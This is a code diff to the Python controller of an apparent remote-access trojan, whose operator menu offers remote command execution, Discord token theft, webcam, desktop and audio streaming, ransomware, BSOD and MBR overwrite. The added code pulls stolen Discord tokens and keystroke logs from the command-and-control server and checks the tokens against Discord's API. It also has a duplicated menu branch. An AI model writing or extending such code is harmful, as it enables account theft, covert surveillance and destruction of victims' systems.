@@ -54,6 +54,7 @@ class main:
             cprint("CONTROLLER", "green", end="")
             print(" ] ", end="")
             cprint(message, "green")
+
     def connect(self):
         self.ws = create_connection(f"wss://{self.host}/api/ws/computers")
         ws = self.ws
@@ -67,6 +68,12 @@ class main:
                 ws = self.ws
                 ws.send(self.key)
 
+    def gettokens(self):
+        tokens = requests.get(f'https://{self.host}/tokens', data={'key': self.key}).json()
+        return tokens
+
+    def check(self, token):
+        return requests.get('https://discord.com/api/v9/users/@me', headers={'authorization': token}).status_code == 200
 
     def sendCommand(self, command, target, type=None):
         if type == "cmd":
@@ -129,17 +136,21 @@ class main:
             self.j = json.loads(ws.recv())
 
         def play(self, target):
+            count = 0
             l = 0
+
             ws = create_connection(f"wss://{self.host}/api/ws/playAudio")
             ws.send(self.key)
             ws.send(target)
-            count = 0
+            
+
             queue = multiprocessing.JoinableQueue()
             threading.Thread(target=self.worker,args=(queue,)).start()
             time.sleep(2)
+
             while not self.Stop:
-                print(count)
                 self.j = False
+
                 start = time.time()
                 threading.Thread(target=self.recv, args=(ws,)).start()
                 while not self.j:
@@ -151,15 +162,19 @@ class main:
                     print(time.time()-j["t"])
                     print(j["t"] > l)
                     continue
+
                 l = j["t"]
                 count += 1
+
                 filename = f"sounds/sound_{count}.wav"
+
                 try:
                     data = base64.b64decode(j["data"])
                     with open(filename, "wb") as file:
                         file.write(data)
                         file.close()
                     queue.put(filename)
+                    
                 except Exception as e:
                     print(e)
                     ws = create_connection(f"wss://{self.host}/api/ws/playAudio")
@@ -250,7 +265,13 @@ class main:
         uiprint = self.uiprint
         columns = self.columns
         length = 15
-        options = ["Run CMD command", "Run PY file", "Get Discord Tokens", "Nuke Discord Tokens", "Update Discord Webhook", "Stream Camera", "Stream Desktop", "Stop Streaming Camera", "Stop Streaming Desktop", "Stream Audio", "Stop Streaming Audio", "Restart Pc", "Start Ransomware", "Start Trollware", "Stop Trollware", "Start BSOD", "Overwrite MBR", "Shutdown Pc", "Show Targets"]
+        options = [
+            "Run CMD command", "Run PY file", "Get Discord Tokens", 
+            "Nuke Discord Tokens", "Update Discord Webhook", "Stream Camera", 
+            "Stream Desktop", "Stop Streaming Camera", "Stop Streaming Desktop", 
+            "Stream Audio", "Stop Streaming Audio", "Restart Pc", 
+            "Start Ransomware", "Start Trollware", "Stop Trollware", 
+            "Start BSOD", "Overwrite MBR", "Shutdown Pc", "Logged Tokens", "Logged Keystrokes", "Show Targets"]
         print("""
                   
                                                                                                   
@@ -302,7 +323,7 @@ Ice Bear#0167   |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice
             except EOFError:
                 uiprint("Exiting...")
                 time.sleep(1)
-                exit()
+                os._exit(0)
             except:
                 uiprint("Invalid option!", "error")
                 time.sleep(1.5)
@@ -416,6 +437,33 @@ Ice Bear#0167   |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice
             self.sendCommand("shutdown", self.target)
 
         elif choice == 19:
+            tokens = self.gettokens()
+            if not tokens:
+                self.uiprint('No available tokens.', 'error')
+                return
+
+            for token in tokens:
+                print(f"Token: {token}")
+            
+            if not self.check(token):
+                uiprint('Invalid Token', 'error')
+            else:
+                uiprint('Valid Token!')
+
+            time.sleep(1.5)
+
+        elif choice == 20:
+            uiprint('Downloading logs...')
+            download = requests.get(f'https://{self.host}/logs', data={'key': self.key}).content
+            with open('logs.zip', 'wb') as file:
+                file.write(download)
+
+            uiprint("Downloaded logs are in 'logs.zip'")
+            time.sleep(1.5)
+
+
+
+        elif choice == 20:
             self.showComputers(False)
 
         self.clear()
